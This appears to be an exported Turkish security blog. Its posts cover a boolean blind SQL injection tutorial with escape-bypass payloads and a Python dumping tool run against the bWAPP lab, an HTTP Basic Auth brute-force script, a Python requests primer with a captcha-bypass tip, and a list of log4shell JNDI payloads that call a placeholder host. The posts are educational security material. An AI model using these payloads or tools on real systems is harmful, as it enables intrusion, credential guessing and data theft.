{"pages":[{"title":"whoami","text":"Cyber Security Specialist Adeo Cyber Security Services | 2017 - Current Web Application Security Web Application Developer Active Directory Security DDoS Contactsmail: info[at]musana[d0t]netgithub: musanatwitter: @musanalinkedin: musasana","link":"/about/index.html"}],"posts":[{"title":"Boolean SQL Injection &amp; Exploit Tool","text":"Sqli bir çok varyasyonu olan bir web uygulama zafiyettir. Ancak hepsinde hedeflenen izinsiz bir şekilde sql sorgusu çalıştırmaktır. Türlerine göre bazılarını istismar etmek çok kolay olsada bazıları için ise fazladan uğraş verilmesi gerekir. Bu tür durumlarda işi otomatize hale getirmek için yazılan ufak toollar, zamandan tasarruf etmek açısından çok başarılı olabilmektedir. Sqli için ise birçok tool mevcut olmasına karşın hatta bizim yazacağımız tooldan bile daha işlevsel olmalarına rağmen bu yazıda kendi toolumuzu yazarak şunu hedefliyoruz aslında; hem zafiyetin arkasındaki mantığı anlamak hem de toollar nasıl yazılır konusunda bir nebzede olsa fikir sahibi olmak. Bu arada sqlmap varken neden böyle bir atraksiyona girişelim sorusu da cevap buldu sanırım. Öte yandan bir zafiyeti istismar ederken kendi ihtiyaçlarınıza göre ufak toolar yazarak pozitif sonuçlar alacak seviyedeyseniz zaten var olan tooları kullanmanızda bir sakınca yok bence. Biz sadece ezbere karşıyız. Mottomuz: Tool kullanmayı değil, tool yazmayı öğret. Konumuza dönecek olursak; boolean sql injection zafiyeti, enjecte edilen sql cümlesinin sadece doğru mu? yanlış mı? olduğu bilgisini veren/sızdıran bir sqli türüdür. Bu sızma; bazen sayfanın tasarımının bozulması sebeb olurken, bazen sayfada değişmeler meydana getirebilir veya birazdan çözeceğimiz örnekte olduğu gibi (geliştirici tarafından dikkat edilmeden) bize sql sorgumuzun doğru veya yanlış olduğu hakkında aslında çok büyük ipucu veren bir çıktı/cümle olabilir. Biz artık veritabanı adından tutun da sutunlardaki bütün verilere kadar herşeyi sorgumuz doğru mu? yanlış mı? cevabı üzerinden giderek çekebileceğiz. Son derece tehlikelidir. Kolaylıkla exploit edilebilir. Harcanan zaman bakımından time based kadar uğraştırmasada diğer sqli çeşitlerine göre exploit etmek biraz daha zaman almaktadır. Bu yazının ana konusu her ne kadar boolean sqli ve exploit toolunun yazılması olsada birazdan çözeceğimiz caseden dolayı mysql_real_escape_string() ve addslashes() fonksiyonlarına da değinmek istedim. Bundan dolayı şu bağlantıdaki birçok zafiyet barındıran web uygulamasını indirerek gerekli ayarları yapınız. Yazının dolu dolu olabilmesi adına güvenlik seviyesini high yaparak sadece boolean sqli değil aynı zamanda mysql_real_escape() ve addslashes() fonksiyonlarının nasıl bypass edilebileceğini de göreceğiz. Listeden A1 kategorisindeki sql injection-blind-boolean based olanı seçiniz. Uygulamamız high seviyesinde iken aşağıdaki resimde de görmüş olduğunuz üzere kullanıcıdan alınan girdi mysql_real_escape_string() fonksiyonundan; medium seviyesinde ise addslashes() fonksiyonundan geçirilmiştir. Öncellikle uygun payloadı yazabilmemiz için mysql_real_escape_string() ve addslashes() fonksiyonlarının nasıl çalıştığını bilmemiz gerekir. Aslında bu iki fonksiyon arasında nüans olsada aynı işi yapmaktadırlar. addslashes() fonksiyonun ifa ettiği işlem; &quot;, ', \\, \\x00 karakterlerini escape etmektedir. mysql_real_escape_string() fonksiyonu ise addslashes() fonksyionunun escape ettiği karaktelere ek olarak cr(\\r), lf(\\n) ve EOF(\\x1a) özel karakterlerini de escape etmektedir. Ayrıca mysql_real_escape_string() fonksiyonunun bir veritabanı fonksiyonu olduğu unutulmamalıdır. Yani herhangi bir veritabanı bağlatısı yok ise kullanmanız durumunda hata alırsınız. İki fonksiyonun kullanımıyla ilgili görüntüler; addslashes() mysql_real_escape_string() Resimlerden de anlaşılacağı üzere kaçış karakterleri, programlama dili için özel anlamı olan karakterlerin, özel anlamları dışında normal bir string ifadeymiş gibi kullanmamızı sağlayan yapıdır. Buraya kadar herşey iyi güzel ancak bu fonksiyonlar zaten sql injection, xss gibi web zafiyetlerinin önüne geçebilmek için yazılmış fonksiyonlar olmasına rağmen nasıl bypass edilebiliyor şimdi ona bakalım. Kullanırken Dikkat!Normal şartlarda mysql_real_escape_string() veya addslaheses() fonksiyonları exploitable değildir. Ancak bu fonksiyonlar kullanılırken 2 önemli nokta gözden kaçırılır ise o zaman zafiyete sebep verilmiş olur. Tırnak işareti arasına yazmak? 1) Dışarıdan aldığınız girdiyi(bu fonksiyonlardan geçirdikten sonra) tutan değişkeni sql cümlesinde yazarken tırnak işareti içerisine yazmalısınız. Neden peki? 123$id = mysql_real_escape_string($_GET['id']); # addslashes() fonksiyonuda olabilir.mysql_query(\"SELECT * FROM uyeler WHERE id=$id\"); Yukarıda görmüş olduğunuz üzere id parametresine verilen değerde bulunabilecek özel karakterler(‘, “) escape edilmektedir. Görünürde bir güvenlik probleminin olmadığı görnüyor AMA ya özel karakter yoksa? :) O zaman bu fonksiyonlara verien girdiler ne ise çıktılar aynısı olacaktır. Yukarıdaki sql cümleciği üzerinden gidersek kullanıcıdan gelen bir ' veya &quot; karakteri escape edileceltir ancak kullanıcı bu karakterileri kullanmadığı zaman hiçbir handikap ile karşılaşmayacaktır. Nihayetinde -1 or 1=1 payloadı sql cümlesine rahatlıkla enjecte edilebilir. “-1” yapmaktaki amacımız ise çok büyük ihtimal ile bu değere sahip bir id değer olmayacağından or dan sonraki yazacağımız sql sorgusu ile sorgunun doğru veya yanlış olduğu sonucunu çıkarabilecek kadar kontrol altına alabilmekteyiz. Sorgumuz aşağıdaki hale bürünecektir ve sorguda herhangi bir mantık ve syntax hatası olmadığından true dönecetir.(uyeler tablosundan id değeri -1 olan üyeyi seç veya 1=1 mi? -1 id numarasına sahip üye yok ancak veya ile cümle bağlandığı için 1=1 önermesinden dolayı true dönecektir.) 1SELECT * FROM uyeler WHERE id=-1 or 1=1 Şimdi $id değişkenini herhangi bir tırnak işareti arasına yazdığımızda neden istismar edilemeyeceğini görelim. 12345678...$id = mysql_real_escape_string($_GET['id']);mysql_query(\"SELECT * FROM uyeler WHERE id='$id'\");...# payloadımızı ilgili alana yerleştirelim.mysql_query(\"SELECT * FROM uyeler WHERE id='or 1=1--+'\") #Yukarıdaki sorguda her ne kadar sondaki tırnaktan kurtulsakta baştaki tırnaktan kurtulamıyoruz. Diğer taraftan tırnaktan kurtulmaya çalışmaz isek bu sefer payloadımız normal bir string olarak işlem görecektir ve injection başarısız olacaktır. Karakter setine dikkat! 2) Databasede kullandığınız karakter setinin gbk veya big5 olmaması. Alakaya maydanoz :) Şimdi yukarıda anlatığımış olduğumuz; “Değişkenin tırnak içerisine yazılması durumunda exploitable edilemez” cümlesinin kısmen yanlış olduğunu gösterelim. Bu da doğrudan karakter setiyle ilgili bir durumdur. Nasıl mı? 0xbf5c(¿\\) karakteri GBK ve big5 karakter setlerinde multibyte bir karakterdir(Bunlar dışında 0xbf5c ifadesinin multibyte olarak kabul edildiği başka karakter setleri de olabilir.) 0xbf(¿) ve 0x5c(\\) birbirlerinden bağımsız değildir. Başka bir ifadeyle ¿\\ karakteri tek bir karakter olarak işleme alınır. Böyle bir durumda kullanıcıdan 0xbf27(¿') girdisinin geldiğini varsayıp bu değeri mysql_real_escape_string() veya addslashes() fonksiyonların birinden geçirdiğimizi düşünürsek bunun doğal sonucu olarak bize 0xbf5c27(¿\\') çıktısını verecektir. İşte olayın püf noktası 0xbf5c(¿\\) ifadesinin tek bir karakter olarak işlem görmesinden dolayı tırnak işaretimizin 0x27(') boşa çıkmasıdır. Bingo! Artık sql sorgusunu istediğimiz şekilde manipüle edebiliriz. 0xe55c(å\\) ifadesi de multibyte bir karakterdir. Bu karakteri kullanarak da injection yapabilirsiniz. Bu arada yazının ileriki bölümlerinde ilgili fonksiyonları bypass edebilmemiz için karakter setinizi gbk veya big5 yapmayı unutmayınız! Aksi halde bypass edemezsiniz. 123$id = $_GET['id'];mysql_query(\"SELECT * FROM uyeler WHERE id='¿\\''\"); # ¿\\ ifadesi tek bir karakter olarak işlendiği için syntax error hatası alınır. Tool’umuzu yazalım!Yukarıdaki gördüğünüz sonucu elde etmeye kadar geldiyseniz ve şimdiye kadar anlatıklarımı da anladıysanız bundan sonrasi çok kolay! Çünkü artık elimizde bir payload var ve bu payload üzerinden doğru/yanlış doğruluk değerleriyle bütün veritabanını dump edebiliriz. Evet yanlış duymadınız 5 kavanoz bal sadece 60tl..:) 12345#TrueSELECT * FROM movies WHERE title='¿\\' or 1=1--+#False:SELECT * FROM movies WHERE title='¿\\' or 1=0--+ Artık or ifadesinden sonra kendi sql sorgumuzu yazacağız ve yazacağımız sorgunun cevabı doğru mu? yanlış mı? şeklinde mantıksal olmalıdır. Misal; 1234567SELECT * FROM movies WHERE title='¿\\' or substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)=CHAR(97)--+SELECT * FROM movies WHERE title='¿\\' or substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)=CHAR(98)--+SELECT * FROM movies WHERE title='¿\\' or substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)=CHAR(99)--+...#Hepsini manuel yazacak değiliz :/ Yukarıdaki sql sorgusu karışık gelmiş olabilir. Kısaca açıklarsak; substr fonksiyonu bir string ifade parçalamamıza yarayan bir mysql fonksiyonudur. information_schema veritabanındaki schemata tablosundaki schema_name sutunundaki ilk veriyi al. Aldığın bu verinin 1 karakterinden başlayarak 1 karakter al.(Diğer bir deyişle “ilk harfi”) İlk harf a’ya eşit mi? Eşit ise “The movie exist in our database!” cümlesi çıkacak, değil ise “The movie does not exists in our database!” cümlesi çıkacak. Aşağıdaki gif herşeyi anlatıyor. Harfler char olduğundan dolayı tırnak işaretleri içerisine yazmamız gerekirdi bu nedenle tırnaklardan kaçmak için ascii tablosundaki karakterlerin sayısal değerini karaktere dönüştüren char() fonksiyonunu kullanarak tırnak işaretinden kaynaklı olası bir syntax hatasından kurtulmuş olduk. Bu arada dikkatinizden kaçmasın, benim case-sensitive off, siz artık duruma göre büyük harfleride olasılık dahiline katmak isterseniz ascii tablosundaki ilgili aralığı alabilirsiniz veya veritabanın bununla ilgili fonksiyonlarından istifade edebilirsiniz. Yukarıdaki gifte gördüğünüz üzere veri tabanındaki çekeceğimiz her kelimedeki harf için payloadımızda ilgili kısmı değiştirip tekrar tekrar denememiz lazım ta ki doğru harfi buluna kadar.Payloadımızdaki değişkenlerimiz belli. substr fonksiyonundaki parametre. eşitliğin sağ tarafı. limit değerimizdeki parametre Aslında tablo ve database değerlerimizde değişken ancak şimdilik fazla karmaşa olmasın. Şimdi kolarımızı sıvayalım ve python ile exploit toolumuzu yazmaya başlayalım. Başlangıç seviyesinde olduğunuzu düşünüyorsanız bu yazımı okuduktan sonra devam edin. Yazacağımız tool aşağıdaki algoritmayı izleyecektir. Bütün olası karakterleri tutan bir değişken/liste oluştur. Listeki bir sonraki karakteri(+1) url’de ilgili yere yaz. Payloadı da ihtiva eden isteği gönder. Dönen cevabı al. Cevabı parse et. Listedeki son eleman denendi mi? Evet ise 9. adıma git, hayır ise 7. adıma git Eğer does not kelimesi var ise 2. adıma git, hayır ise 8. adıma git. O an denenen harfi bir değişkende tut ve substr’nin ikinci parametresini 1 arttır ve 2. adıma git. Listedeki bütün elemanlar denenmesine rağmen sonuç negatif ise limit değerini 1 arttır ve payloaddaki değişkenlerini sıfırlayıp 2. adıma git. Bizim izleyeceğimiz algoritma yukarıdaki olacak ancak tabiki de farklı algoritmalar ile de çözüme ulaşılabilir. Örneğin doğru sorgu ile yanlış sorgu arasındaki tek fark does not kelimesidir. Pythonda beautifulsoup kütüphanesini kullanarak does not kelimesi yok ise doğru, var ise yanlış şeklinde bir çıkarsama ile çözüme ulaşabilirsiniz. Boolean sqli payloadToolumuzu yazmaya başlamadan önce kullanacağımız payloadları verelim.Bütün veritabanları isimlerini çekmek için; 1http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)=CHAR(97)--+&amp;action=search--+ Aktif veritabanındaki tüm tablo isimlerini çekmek için; 1http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database()),1,1)=CHAR(97)--+&amp;action=search--+ Seçilen tablodaki tüm sutun isimlerini çekmek için; 1http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT column_name FROM information_schema.columns WHERE table_name=CHAR(tablo_adi_decimal_değeri) AND table_schema=database() LIMIT 0,1),1,1)=CHAR(97)--+&amp;action=search\" Seçilen sütundaki bilgileri çekmek için; 1http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT sutun_adi1 FROM table_adi LIMIT 0,1),1,1)=CHAR(97)--+&amp;action=search Tabi bu payloadlarımızda yukarıda bahsettiğimiz değişken kısımlarının değiştirilerek deneme/yanılma yöntemi ile harflerin tek tek bulunması gerekir. Bu da akıl alır gibi değil. Bu yüzden bunu otomatize hale getirmek için tool yazıyoruz ve artık boolean sqli zafiyetini exploit etmek için gerekli bilgiye ve payloadlara sahip olduğumuza göre başlayalım. 123456789import requestsfrom bs4 import BeautifulSoup as bsfrom termcolor import cprint, colored# Bütün olası karakterlerlerin ascii tablosundaki sayısal aralıklarını alıyoruz.alfabe = list(range(43,58))+list(range(95,123))+list() # Uygulamamızda loginning olduğundan cookie değerimizi alıyoruz.login = {'PHPSESSID': 'cpfrrq0867totod6h7lhsv3nk5', 'security_level':'2'} Yukarıdaki aralığı siz kendi ihtiyacınıza göre genişletebilirsiniz. PHPSESSID ise giriş/çıkış durumlarında değiştiği için dikkat ediniz. Kodumuzun devamında ise iç içe 3 adet for döngüsü kuracağız. Bunlardan en dıştaki for; veritabanları, tablolar ve sutunların sayıları ile ilgili olacak. Kaç sutun, kaç tablo, kaç db bulmasını istersiniz? Orta kısımdaki for; veritabanı, tablo veya sutun isimlerindeki uzunluk ile ilgili olacak. En içteki for ise olasılık kümemizdeki bütün harfleri denemek için olacak. 123456789101112131415161718192021222324252627282930313233# Çekilecek veritabanı, tablo veya kolon sayısıfor i in range(3): nxt = True # Çekilecek olan veritabanı, talo, veya kolon ismi uzunluğu for j in range(1,42): if nxt: for k in alfabe: url = \"http://localhost/bWapp/bwapp/sqli_4.php?title=%bf%27 or substr((SELECT schema_name FROM information_schema.schemata LIMIT \"+str(i)+\",1), \"+str(j)+\",1)=CHAR(\"+str(k)+\")--+&amp;action=search\" req = requests.get(url, cookies=login) # request send# nxt değişkenimiz ise doğru karakteri bolduğunda içteki döngüden çıkıp, substr parametresinin değerini bir arttırmak için kontrol değişkenimiz. beau = bs(req.text, \"lxml\") # Dönen cevabı lxml formatında al. result = beau.find(\"form\").next_sibling #cevapta bulunan form elemanından sonraki etiketsiz stringi al. if not \"does not\" in result: # Result değişkenimizdeki stringde \"does not\" kelimesi var ise... cprint(\"Found! \"+chr(k)+\" - \"+url, \"white\", \"on_green\") #cprint modülü konsolda renkli çıktı vermek için fazla takılmayın buraya. print kullanabilirsiniz. db += chr(k) # Bulunan kelimeyi ilgili değişkene ekle. break #İçteki döngüden çık. else: # does not kelimesi geçiyor ise... cprint(\"Failed! \"+chr(k)+\" - \"+url, \"white\", \"on_red\") if chr(k) == \"z\": #Olasılıklar kümemizdeki son eleman olan \"z\" denendi mi? db += \", \" cprint(\"Veritabanı Adı: \"+db, \"white\", \"on_cyan\", attrs=['bold']) with open(\"data.txt\", \"a\") as p: #Bulduğumuz tablo adları sutunlardaki veriler vs. metin dosyasına yazdık. p.writelines(db+\"\\n\") nxt = False break else: break Her satırın neyi icra ettiğini kısaca ifade etmeye çalıştım ayrıca incelemek isteyen olur diye githuba da yükledim. Biliyorum tam otomatize bir tool olmadı. Çünkü veri tabanı isimlerini bulduktan sonra tablo isimlerini bulması için kaynak kodda yukarıda verdiğimiz payloadları kullanarak elle değiştirmeniz gerekir. Aynı işlemi sutün isimlerini bulduğunuz zamanda uyarlamanız gerekecektir. Github da duruyor zaten katkı sağlamak isteyen olursa ilgilenebilir.Neler eklenebilir?Öncellikle veri tabanı ismini bulduktan sonra tablo isimlerini bulması için payloadı kendisi generate edebilir ve yine aynı şekilde sutun isimleri ve veriler içinde yapılabilir. Bir payload listesi oluşturulup brute force ile zafiyet araması otomotik hale getirilebilir. Umarım bu blog post sql injection saldırılarındaki temel mantaliteye dair bir fikir vermiştir. Sağlıcakla kalınız.","link":"/2016/08/14/Boolean-SQL-Injection-Exploit-Tool/"},{"title":"HTTP Basic Authentication Brute-Force","text":"Burp Suite İle HTTP Basic Auth Brute ForceHTTP Basic Authentication, kimlik bilgilerini http paketine eklediği Authentication başlığında aşağıdaki formata uygun şekilde tutmaktadır. 1Authorization: Basic base64encode(&quot;username:password&quot;) Brute force yaparken bizim değişken alanımız http headerlerında bulunan Authorization: Basic kısmından sonraki ifade olan base64 ile encode edilmiş kısım olacaktır. İlk olarak burp suite proxy moda aldıktan sonra test amaçlı bir kimlik bilgisi girilir. İsteğimiz burp tarafından yakalandıktan sonra Send to Intruder diyerek intruder sekmesine gönderiyoruz. Bu bölümde ise değişken olan alanımızı seçtikten sonra yan tarafta bulunan Add to § diyerek değişken alanımızı belirtiyoruz. Bundan sonra sonra değişken alanımıza verilecek değerleri belirtmemiz gerekir. Bunun için Payloads sekmesine geliyoruz. Yukarıdaki resimde işaretli olan alanlara değinecek olursak; Payload Sets kullanacağımız payload kümesinin türünü ifade etmektedir. Biz burda custom olanı seçerek değerleri dışardan gireceğimizi ifade ediyoruz. Payload Options bölümünde ise hazır bir wordlisti load edebileceğimiz gibi, manuel değerler girerek de mini bir wordlist oluşturulabilir. İşlemin uzun sürmemesi adına manuel olarak bir kaç kullanıcı adı ve parola değeri giriyorum. Seçenekelerimiz marker ile işaretlenen kısımlar gibi olmalıdır. position: 1 ifadesi username değerlerimizi ifade etmektedir. Parola değerlerini de eklemek için position değerini 2 yaparak listeye manuel olarak parola değerleri giriniz. (veya parola wordlisti yükleyebilirsiniz.) Seperator for position 1 kısmında seperate karakterimizi : nokta seçmemizin nedeni kimlik bilgilerinin username:password formatında gönderilmesinden dolayı. Payload Processing bölümünde ise değişken alanımızdaki değerlerin base64 ile encode edilip gönderildiğinden, add diyerek encode seçeneğini base64 olarak belirtiyoruz. Son olarak base64 encode işlemi 4’ün katlarına tamamlamak için sona konulan = ifadelerini encode etmesini engellemek için payload encoding kısmından = işaretini kaldırarak payladın doğru bir şekilde gönderilmesini sağlıyoruz. Bu adımları sorunsuz bir şekilde uyguladıktan sonra attack diyerek sadece 200 dönen cevaba bakmamız gerekir.(Başarısız olanlar için 401 durum kodu dönmektedir.) TRICK: Ayrıca options sekmesinde thread sayısını artırma, yeniden bağlanma, başlama zamanı gibi çesitli seçenekleri de ayarlayabilirsiniz. Bu işlemi burp dışında pythonda bulunan request kütüphanesi ile yapmak isterseniz aşağıdaki ufak tool’da işinizi görecektir. Request Kütüphanesiyle HTTP Basic Auth Brute ForceBruteForceHBA.py1234567891011121314151617181920212223242526272829303132333435363738# Author: Musa ŞANA# Date: 29.10.2017# Usage: python3 BruteForceHBA.py http://localhost/http-basic-auth username.txt password.txtimport requestsfrom sys import argvfrom requests.auth import HTTPBasicAuthdef main(*argv): if len(argv) &lt; 1: print(\"\\nUSAGE: BruteForceHBA.py &lt;url&gt; &lt;username.txt&gt; &lt;password.txt&gt;\\n\") quit() else: attack(argv[0], username(argv[1]), password(argv[2]))def username(usernameList): with open(usernameList , \"r\") as u: username = u.read().splitlines() return usernamedef password(passwordList): with open(passwordList, \"r\") as p: password = p.read().splitlines() return passworddef attack(url, username, password): print(\"TARGET: \"+url) for user in username: for passw in password: req = requests.post(url, auth=HTTPBasicAuth(user, passw)) if req.status_code == 200: print(\"-\"*60, \"\\n[!] FOUND - Username: \"+user+\" Password: \"+passw, \"\\n\", \"-\"*60) quit() else: print(\"[*] \", req.status_code, \"Username: \"+user+\" - Password: \"+passw)if __name__ == \"__main__\": main(*argv[1:]) Güvenli günler.","link":"/2017/01/14/HTTP-Basic-Authentication-Brute-Force/"},{"title":"Python Requests Kütüphanesi","text":"requests minimalist bir python modülüdür. Bu modül ile en temel şekilde http/https protokollerine yönelik request/response işlemlerimizi gerçekleştirebiliriz.Requests modülünü pip ile kurmak için; 1pip3 install requests Kaynak koddan kurmak için ise; 1git clone git://github.com/kennethreitz/requests.git indirdiğiniz dizine girip python3 setup.py install diyerek kurabilirsiniz. Everything is requestArtık modülümüzü kullanmaya başlayabiliriz. 12import requestreq = requests.get(\"http://musana.net\") En basit haliyle; musana.net adresine get metoduyla bir istekte bulunduk ve artık elimizde req adında bir nesne mevcut. İstekte bulunduğumuz bağlantıya ait bütün bilgilere req nesnesi üzerinden erişebiliriz. HTTP metodları ile istek yapmakGET metodu ile ilgili parametre(ler)ye değer vermek veya POST metodu ile form elemanlarına değer verip göndermek için özellikle sözlük veri tiplerinden yararlanıyoruz. Aşağıdaki kod blogunu inceleyerek verilen parametreye bağlı olarak oluşan url yapısına dikkat ediniz. 12345678910111213import requestsreq = requests.get(\"http://musana.net\", params={'par':'value'})print(req.url) #Output: http://musana.net/?par=valuereq = requests.get(\"http://musana.net\", params={'par1':'value1', 'par2':'value2'})print(req.url) #Output: http://musana.net/?par1=value2&amp;par2=value2req = request.get(\"http://musana.net\", params={'par1':'value1', 'par2':['val1', 'val2', 'val3']})print(req.url) #Output: http://musana.net/?par1=value1&amp;par2=val1&amp;par2=val2&amp;par2=val3req = requests.post(\"http://musana.net\", data={'kullanici':'musa', 'meslek':'talebe'})#Yukarıdaki kod; name attributenün değeri 'kullanici' olan form elemanının value değerini `musa` ve diğer name attributenün değeri 'meslek' olanın value değerini `talebe` olacak şekilde post metodunu kullanarak request gönderecektir. Diğer HTTP metotlarını kullanarak request göndermek istediğimizde ise değişen tek şey metot isimleridir. 123456import requests # Diğer http metodları ile istek yapmakreq = reqeusts.head(\"http://musana.net\")req = requests.delete(\"http://musana.net\")req = requests.option(\"http://musana.net\")req = requests.head(\"http://musana.net\") HTTP Başlık Bilgisi Eklemeİstekte bulunurken HTTP başlık bilgilerini(Referrer, host, cookie, user-agent vs) eklemek isteyebiliriz. Bunun için methodumuza headers parametresini tanımlayacağız ve değerini ise sözlük veri tipini kullanarak {&quot;http-baslık-adı&quot;:&quot;baslık-degeri&quot;} şeklinde vereceğiz. Örneğin bir web uygulamasının web sürümünde çıkan captcha, mobil sürümünde çıkmayabilir. Bu durumda kolaylıkla olası bir brute-force saldırısı düzenlenebilir. HTTP başlıklarından user-agent değerini mobil bir telefonun browser bilgilerini ekleyerek captcha’yı bypass edebiliriz. 12import requestsreq = requests.post('http://musana.net', headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36'} Yukarıdaki kod musana.net sitesine Samsung Glaxy S6 telefonunun kullanıdğı tarayıcı bilgilerini kullanarak istekte bulunacak ve hedef site gelen user-agent bilgisine göre cevap döndürecektir. Örneğimiz üzerinden gidersek captcha çıkmayacağı anlamına gelir bu. Diğer http header bilgilerini de aynı bu yöntemle istediğiniz şekilde değiştirebilirsiniz. HTTP Response İşlemleriİstek yaptığımıza göre artık dönen cevabı nasıl işleyebileceğimize bakalım. 123import requestsreq = requests.get(\"http://musana.net\", params={'par1':'value1', 'par2':'value2'})print(req.text) # Dönen cevabı text formatına çevirdik. Artık normal bir string üzerinde yapabileceğiniz tüm işlemleri yapabilirsiniz. Yaptığımız isteğe karşılık dönen HTTP Response kodunu öğrenmek için ise; 123import requestsreq = reqeusts.get(\"http://musana.net\")print(req.status_code) #Output: 200, 404?, 302?, 500? ... Sunucudan dönen cevabın başlık bilgilerine erişebilmek için ise request nesnemize headers nesne değişkeni üzerinden erişebiliriz. Bu değer bize bütün header response bilgisini sözlük tipinde verecektir. Daha spesifik başlıklara erişmek için sözlük yapısını kullanabiliriz. Örneğin;req.headers.get(&quot;content-type&quot;) diyerek içeriğin hangi formatta ve hangi karakter setini kullandığı bilgisine ulaşabiliriz. Erişmeye çalıştığımız başlık değeri yok ise sonuç None dönecektir. 12345678910import requestreq = requests.get(\"http://musana.net\")print(req.headers)#Çıktımız:{'CF-RAY': '307f6aa1408a2bb2-AMS', 'Server': 'cloudflare-nginx', 'X-GitHub-Request-Id': 'ADF53550:23C34:E6E456:5839D4F6', 'Date': 'Sat, 26 Nov 2016 18:31:18 GMT', 'Cache-Control': 'max-age=600', 'Set-Cookie': '__cfduid=d1c34cf17ebe35c3c407a8ca97672e1951480185077; expires=Sun, 26-Nov-17 18:31:17 GMT; path=/; domain=.musana.net; HttpOnly', 'Access-Control-Allow-Origin': '*', 'Content-Encoding': 'gzip', 'Expires': 'Sat, 26 Nov 2016 18:41:18 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Connection': 'keep-alive', 'Transfer-Encoding': 'chunked', 'Last-Modified': 'Fri, 18 Nov 2016 11:31:04 GMT'}# Sadece istenilen başlık değerine ulaşmak istersek;print(req.headers.get(\"content-type\")) # Output: text/html; charset=utf-8print(req.headers.get(\"content-encoding\")) # Output: gzip Dosya GöndermekHer zaman string bir ifade göndermeyebiliriz. Karşı sunucuya bir dosya yüklemek isteyebiliriz bunun için ise files parametresini tanımlayıp değerine sözlük veri tipi yardımıyla bir dosya adı veya dosya içeriğini veriyoruz. 123import requestsdosya = {\"dosyam\":open(\"python.txt\", \"rb\")} #name değeri dosyam olan form elemanını python.txt dosyamıza binary formreq = requests.post(\"http://musana.net\", files=dosya) Bir string ifadeyi istediğimiz bir dosya formatında göndermek için ise; 123import requestsdosya = {\"dosyam\":(\"python.txt\", \"Burası python.txt dosyasına yazılmaktadır.\")}req = requests.post(\"http://musana.net\", files=dosya) Timeout, SSL, HTTP Basic AuthGöndereceğimiz isteğin zaman aşım süresini kontrol etmek isteyebileceğimiz durumlar olabilir. Bu durumda timeout parametesine dönecek olan cevabın verdiğimiz zaman değerini aşması durumunda isteğimiz zaman aşımına uğrayacaktır. Meydana gelen ConnectTimeoutError hatasını exception handling ile kontrol edebiliriz. 123import requestsreq = requests.get('http://github.com', timeout=0.099)# İstek yapıldıktan sonra 99 milisaniye sonra cevap dönmez ise timeout meydana gelir. Request göndereceğimiz bağlantının SSL desteği varsa yani HTTPS protokolünü kullanıyorsa bağlanmak istediğimiz zaman requests.exceptions.SSLError hatasını alabiliriz. Bu durumda verify parametresine sertifika yolumuzu belirterek istek gönderebiliriz. 12import requestsrequests.get('https://github.com', verify='/sertifikanızın/dizin/adresi') Ayrıca verify parametresine False değerini vererek doğrulanmış SSL sertifikasını göz ardı edebilirsiniz. HTTP Basic Authentication kimlik doğrulamasında login olabilmek için ise; 12from requests.auth import HTTPBasicAuthrequests.get('https://api.github.com/user', auth=HTTPBasicAuth('user', 'pass')) requests modülünü kullanarak yapabileceğimiz en temel işlemler bunlar olmakla beraber daha fazlası için resmi dökümantasyonu inceleyebilirsiniz. Sağlıcakla kalınız.","link":"/2016/10/23/Python-Requests-Kutuphanesi/"},{"title":"log4shell - Quick Guide","text":"0x00 IntroductionCVE-2021-44228 (a.k.a. log4shell) is a Remote Code Execution vulnerability in the Apache Log4j library, a Java-based logging tool widely used in applications around the world. This vulnerability allows an attacker who can control log messages to execute arbitrary code loaded from attacker-controlled servers — and we anticipate that most apps using the Log4j library will meet this condition. Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. Affected versions are 2.0 &lt;= Apache log4j &lt;= 2.14.1 0x01 How to works An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: ${jndi:ldap://domain.com/j}) The payload is passed to log4j for logging. Log4j interpolates the string and queries the malicious ldap server. The ldap server responds with directory information that contains the malicious java class. Java deserializes or download the malicious java class and execute it. 0x02 Simple DNS Log Monitor Services canarytokens ceye dnslog requestbin burp collaborator run your own dns servers 0x04 Waf Bypass &amp; Data Extraction Payloads123456789101112131415161718192021${jndi:ldap://domain.com/j}${jndi:ldap:/domain.com/a}${jndi:dns:/domain.com}${jndi:dns://domain.com/j}${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}${${::-j}ndi:rmi://domain.com/j}${jndi:rmi://domainldap.com/j}${${lower:jndi}:${lower:rmi}://domain.com/j}${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}jn${env::-}di:jn${date:}di${date:':'}j${k8s:k5:-ND}i${sd:k5:-:}j${main:\\k5:-Nd}i${spring:k5:-:}j${sys:k5:-nD}${lower:i${web:k5:-:}}j${::-nD}i${::-:}j${EnV:K5:-nD}i:j${loWer:Nd}i${uPper::} The following payloads can be used for data extraction if you got ping back but it’s non exploitable. 